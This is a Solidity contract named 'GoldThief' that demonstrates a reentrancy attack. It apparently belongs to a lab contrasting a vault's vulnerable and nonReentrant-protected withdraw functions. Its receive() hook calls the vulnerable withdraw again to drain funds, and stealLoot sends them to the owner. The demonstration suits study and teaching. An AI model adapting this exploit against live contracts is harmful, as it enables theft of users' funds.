// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IVault{
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief{

    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress){
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    function attackVulnerable() external payable{
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        attackingSafe = false;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    receive() external payable{
        attackCount++;

        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }
        if (attackingSafe){
            targetVault.safeWithdraw(); // This will fail due to nonReentrant
        }
    }

    function attackSafe() external payable{
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackingSafe = true;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
